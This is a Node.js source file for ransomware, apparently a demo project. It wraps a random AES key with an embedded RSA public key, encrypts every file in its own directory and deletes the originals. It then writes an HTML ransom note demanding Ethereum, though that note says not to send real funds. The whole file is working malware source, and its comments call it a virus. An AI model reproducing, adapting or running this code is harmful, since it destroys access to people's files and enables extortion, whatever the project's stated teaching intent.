const {
	writeFileSync,
	readdirSync,
	lstatSync,
	createReadStream,
	createWriteStream,
	unlinkSync,
	existsSync,
} = require('fs');
const { dirname, join, extname } = require('path');
const { randomBytes, publicEncrypt, createCipheriv } = require('crypto');

//* These code ensure the directory name is correct
let directory;
if (process.pkg) {
	//*  It is run as an executable
	directory = dirname(process.execPath);
} else {
	//*  It is run with nodejs
	directory = __dirname;
}

if (existsSync(join(directory, 'device_key_encrypted.dat'))) {
	console.log('You have already encrypted your files once, are you sure you want to pay more?');
	process.exit(1);
}

//! CHANGE THIS PUBLIC KEY
const PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoK+jQ8f3O3Ug4GdLEK5X
MixXGi72NMIhU2lEE/BXF3C42J/fjVNYPXvZPzX/Cz3atGBX7D2nK28YntVvAII0
dEZMvcmkR5Y4ZYahFWYyU4NcOWU/TEMv2w3IsQ4Eageu+1D+qS9rCIbj619wYCeJ
ncpMwYD2b0fGpyHZUEfNLX2Qf8QRZPKRtQx05MUPNjgRO/nnXDjq6xs7hEYZB6Nd
fvGjOaggtmY0/7X+wnojkZXyjkbbRRUPiB3/rgXhXsv89T9ioQZO2enK4A6JWn/s
bFYyUBmQ+uzhADy3HcQZkfMGGwZho6FFtOQNZv1fPVbAMPxAGm61yG46uWgiqJUV
8QIDAQAB
-----END PUBLIC KEY-----`;

// Generate a unique device key for each client
const DEVICE_KEY = randomBytes(24);

// Encrypt the device key using the public key, so the client can't decrypt the file that encrypted them
const DEVICE_KEY_ENCRYPTED = publicEncrypt(PUBLIC_KEY, DEVICE_KEY);
writeFileSync(join(directory, 'device_key_encrypted.dat'), DEVICE_KEY_ENCRYPTED);

// Make sure the virus doesn't encrypt these files
const NO_TOUCH = [
	'encrypt.exe',
	'encrypt.elf',
	'encrypt.app',
	'decrypt.exe',
	'decrypt.elf',
	'decrypt.app',
	'encrypt.js',
	'decrypt.js',
	'device_key_encrypted.dat',
];

readdirSync(directory).forEach((filename) => {
	const rawFilename = filename;
	filename = join(directory, filename);

	if (
		lstatSync(filename).isFile() &&
		extname(filename) !== '.encrypted' &&
		extname(filename) !== '.iv' &&
		!NO_TOUCH.includes(rawFilename)
	) {
		// Create a initialization vector
		const iv = randomBytes(16);

		const cipher = createCipheriv('aes-192-cbc', DEVICE_KEY, iv);
		const input = createReadStream(filename);
		const output = createWriteStream(`${filename}.encrypted`);

		// Write encrypted data into the file using the cipher
		input.pipe(cipher).pipe(output);

		// Write the initialization vector in hexadecimal format
		writeFileSync(`${filename}.iv`, iv.toString('hex'));

		// Remove the original file
		unlinkSync(filename);
	}
});

/**
 * Make sure there's a way to communicate with the user (e.g. email, etc)
 */
const HTML_TEMPLATE = `
<html>
	<head>
		<title>Your Files Have Been Encrypted</title>
	</head>
	<body>
		<h1>Your files have been encrypted!</h1>
		<p>Please send 0.3 Ethereum to the following address: 0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDDEADBEEF</p>
		<em>For the sake of the project, please DO NOT send any real ethereum to this address!</em>
		<br>
		<p>Make sure you send this:
		<br>
		<p><em>${DEVICE_KEY_ENCRYPTED.toString('hex')}</em></p>
		<p>Along with your transaction as a message input. We will soon get in touch</p>
		<br>
		<h1>Warning: Any tampering with any of the files in this directory will result in permanent loss of the file</h1>
	</body>
</html>
`;

writeFileSync(join(directory, 'NOTICE.html'), HTML_TEMPLATE, { flag: 'w+' });
